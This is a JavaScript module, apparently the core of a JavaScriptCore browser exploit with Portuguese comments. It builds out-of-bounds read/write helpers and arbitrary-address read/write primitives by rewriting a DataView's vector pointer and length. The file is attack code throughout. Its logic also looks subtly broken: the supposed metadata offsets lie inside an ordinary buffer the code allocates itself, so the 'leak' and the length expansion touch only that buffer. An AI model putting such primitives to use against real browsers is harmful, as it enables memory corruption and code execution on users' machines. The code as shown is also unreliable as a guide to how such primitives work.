// js/core_exploit.mjs (Versão Estável Consolidada)

import { AdvancedInt64 as Utils_AdvancedInt64_Ref, PAUSE, toHex } from './utils.mjs';
import { logS3 as log } from './script3/s3_utils.mjs';
import { OOB_CONFIG, JSC_OFFSETS, updateOOBConfigFromUI } from './config.mjs';

export let oob_array_buffer_real = null;
export let oob_dataview_real = null;
let isOOBEnvironmentSetup = false;

// Garante que 'AdvancedInt64' seja um nome válido em todo o módulo.
const AdvancedInt64 = Utils_AdvancedInt64_Ref;

function _local_isAdvancedInt64Object(obj) {
    // Uma verificação robusta se o objeto é da nossa classe de 64 bits.
    return obj instanceof AdvancedInt64;
}

const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58;
const OOB_DV_M_VECTOR_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
const OOB_DV_M_LENGTH_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
const OOB_DV_M_MODE_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;

export function clearOOBEnvironment(options = { force_clear_even_if_not_setup: false }) {
    oob_array_buffer_real = null;
    oob_dataview_real = null;
    isOOBEnvironmentSetup = false;
}

export function getOOBAllocationSize() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.ALLOCATION_SIZE;
}

export async function triggerOOB_primitive(options = { force_reinit: false }) {
    const FNAME_TRIGGER = 'CoreExploit.triggerOOB_primitive';
    if (isOOBEnvironmentSetup && !options.force_reinit) {
        if (oob_dataview_real && oob_dataview_real.buffer === oob_array_buffer_real) {
             return true;
        }
    }
    log(`--- Iniciando Configuração do Ambiente OOB (Force reinit: ${options.force_reinit}, Setup anterior: ${isOOBEnvironmentSetup}) ---`, 'test', FNAME_TRIGGER);
    const currentAllocSize = getOOBAllocationSize();
    log(`    Config OOB: AllocSize=${currentAllocSize}`, 'info', FNAME_TRIGGER);
    clearOOBEnvironment({ force_clear_even_if_not_setup: true });
    try {
        oob_array_buffer_real = new ArrayBuffer(currentAllocSize);
        oob_dataview_real = new DataView(oob_array_buffer_real, 0, currentAllocSize);

        // MODIFICAÇÃO ESSENCIAL: Tenta ler o endereço do buffer de dados e o anexa ao objeto DataView.
        // O resultado (mesmo que seja 0x0) é um diagnóstico vital.
        const buffer_addr_low = oob_dataview_real.getUint32(OOB_DV_M_VECTOR_OFFSET, true);
        const buffer_addr_high = oob_dataview_real.getUint32(OOB_DV_M_VECTOR_OFFSET + 4, true);
        oob_dataview_real.buffer_addr = new AdvancedInt64(buffer_addr_low, buffer_addr_high);
        log(`    Endereço do Buffer de Dados (m_vector) vazado: ${oob_dataview_real.buffer_addr.toString(true)}`, "leak");

        if (currentAllocSize > OOB_DV_M_LENGTH_OFFSET + 3) {
            oob_dataview_real.setUint32(OOB_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, true);
            log(`    m_length do oob_dataview_real expandido para 0xFFFFFFFF no offset ${toHex(OOB_DV_M_LENGTH_OFFSET)}.`, 'info', FNAME_TRIGGER);
        } else {
            throw new Error(`Falha ao expandir m_length: currentAllocSize (${currentAllocSize}) é muito pequeno.`);
        }
        
        log(`Ambiente para Operações OOB CONFIGURADO com sucesso.`, 'good', FNAME_TRIGGER);
        isOOBEnvironmentSetup = true;
        return true;
    } catch (e) {
        log(`ERRO CRÍTICO em ${FNAME_TRIGGER}: ${e.message}`, 'critical', FNAME_TRIGGER);
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        throw e;
    }
}

export function oob_read_absolute(offset_in_oob_buffer, byteLength) {
    if (!isOOBEnvironmentSetup || !oob_dataview_real) {
        throw new Error("Ambiente OOB não inicializado para oob_read_absolute.");
    }
    try {
        switch (byteLength) {
            case 1: return oob_dataview_real.getUint8(offset_in_oob_buffer);
            case 2: return oob_dataview_real.getUint16(offset_in_oob_buffer, true);
            case 4: return oob_dataview_real.getUint32(offset_in_oob_buffer, true);
            case 8:
                const low = oob_dataview_real.getUint32(offset_in_oob_buffer, true);
                const high = oob_dataview_real.getUint32(offset_in_oob_buffer + 4, true);
                return new AdvancedInt64(low, high);
            default: throw new Error(`Tamanho de leitura inválido para oob_read_absolute: ${byteLength}`);
        }
    } catch (e) {
        log(`ERRO em oob_read_absolute lendo do offset ${toHex(offset_in_oob_buffer)}: ${e.message}`, "error");
        throw e;
    }
}

export function oob_write_absolute(offset_in_oob_buffer, value, byteLength) {
    if (!isOOBEnvironmentSetup || !oob_dataview_real) {
        throw new Error("Ambiente OOB não inicializado para oob_write_absolute.");
    }
    try {
        let val64;
        switch (byteLength) {
            case 1: oob_dataview_real.setUint8(offset_in_oob_buffer, Number(value)); break;
            case 2: oob_dataview_real.setUint16(offset_in_oob_buffer, Number(value), true); break;
            case 4: oob_dataview_real.setUint32(offset_in_oob_buffer, Number(value), true); break;
            case 8:
                val64 = _local_isAdvancedInt64Object(value) ? value : new AdvancedInt64(value);
                oob_dataview_real.setUint32(offset_in_oob_buffer, val64.low(), true);
                oob_dataview_real.setUint32(offset_in_oob_buffer + 4, val64.high(), true);
                break;
            default: throw new Error(`Tamanho de escrita inválido para oob_write_absolute: ${byteLength}`);
        }
    } catch (e) {
        log(`ERRO em oob_write_absolute escrevendo no offset ${toHex(offset_in_oob_buffer)}: ${e.message}`, "error");
        throw e;
    }
}

export function isOOBReady() {
    let mLengthExpanded = false;
    if (isOOBEnvironmentSetup && oob_dataview_real && oob_array_buffer_real) {
        try {
            mLengthExpanded = (oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET, true) === 0xFFFFFFFF);
        } catch (e) { mLengthExpanded = false; }
    }
    return isOOBEnvironmentSetup && mLengthExpanded;
}

export async function arb_read(absolute_address, byteLength, offset_from_addr = 0) {
    if (!isOOBReady()) {
        await triggerOOB_primitive({force_reinit: true});
    }
    
    let addr64 = _local_isAdvancedInt64Object(absolute_address) ? absolute_address : new AdvancedInt64(absolute_address);
    if (offset_from_addr) {
        addr64 = addr64.add(offset_from_addr);
    }

    let m_vector_orig_snap;
    try {
        m_vector_orig_snap = oob_read_absolute(OOB_DV_M_VECTOR_OFFSET, 8);
        oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, addr64, 8);
        
        let result_val;
        switch (byteLength) {
            case 1: result_val = oob_dataview_real.getUint8(0); break;
            case 2: result_val = oob_dataview_real.getUint16(0, true); break;
            case 4: result_val = oob_dataview_real.getUint32(0, true); break;
            case 8:
                const low = oob_dataview_real.getUint32(0, true);
                const high = oob_dataview_real.getUint32(4, true);
                result_val = new AdvancedInt64(low, high);
                break;
            default: throw new Error(`Tamanho de leitura inválido para arb_read: ${byteLength}`);
        }
        return result_val;
    } finally {
        if (m_vector_orig_snap && isOOBReady()) {
            oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, m_vector_orig_snap, 8);
        }
    }
}

export async function arb_write(absolute_address, value, byteLength, offset_from_addr = 0) {
    if (!isOOBReady()) {
        await triggerOOB_primitive({force_reinit: true});
    }

    let addr64 = _local_isAdvancedInt64Object(absolute_address) ? absolute_address : new AdvancedInt64(absolute_address);
    if (offset_from_addr) {
        addr64 = addr64.add(offset_from_addr);
    }
    
    let m_vector_orig_snap;
    try {
        m_vector_orig_snap = oob_read_absolute(OOB_DV_M_VECTOR_OFFSET, 8);
        oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, addr64, 8);
        
        let val64_write;
        switch (byteLength) {
            case 1: oob_dataview_real.setUint8(0, Number(value)); break;
            case 2: oob_dataview_real.setUint16(0, Number(value), true); break;
            case 4: oob_dataview_real.setUint32(0, Number(value), true); break;
            case 8:
                val64_write = _local_isAdvancedInt64Object(value) ? value : new AdvancedInt64(value);
                oob_dataview_real.setUint32(0, val64_write.low(), true);
                oob_dataview_real.setUint32(4, val64_write.high(), true);
                break;
            default: throw new Error("Tamanho de escrita inválido para arb_write");
        }
    } finally {
        if (m_vector_orig_snap && isOOBReady()) {
            oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, m_vector_orig_snap, 8);
        }
    }
}

export async function selfTestOOBReadWrite(logFnParam) {
    const currentLog = logFnParam || log;
    currentLog(`--- Iniciando Auto-Teste de OOB R/W ---`, 'test');
    try {
        await triggerOOB_primitive({ force_reinit: true });
        const test_offset = 0x100;
        const test_val32 = 0xABCD1234;
        oob_write_absolute(test_offset, test_val32, 4);
        const read_val32 = oob_read_absolute(test_offset, 4);
        if (read_val32 !== test_val32) throw new Error(`Auto-teste de 32 bits falhou! Lido ${toHex(read_val32)}, esperado ${toHex(test_val32)}`);
        currentLog(`Auto-teste de 32 bits bem-sucedido.`, "good");
        
        const test_val64 = new AdvancedInt64(0x11223344, 0x55667788);
        oob_write_absolute(test_offset + 8, test_val64, 8);
        const read_val64 = oob_read_absolute(test_offset + 8, 8);
        if (!_local_isAdvancedInt64Object(read_val64) || !read_val64.equals(test_val64)) throw new Error(`Auto-teste de 64 bits falhou! Lido ${read_val64.toString(true)}, esperado ${test_val64.toString(true)}`);
        currentLog(`Auto-teste de 64 bits bem-sucedido.`, "good");
        
        return true;
    } catch (e) {
        currentLog(`ERRO no Auto-Teste OOB R/W: ${e.message}`, 'critical');
        return false;
    }
}
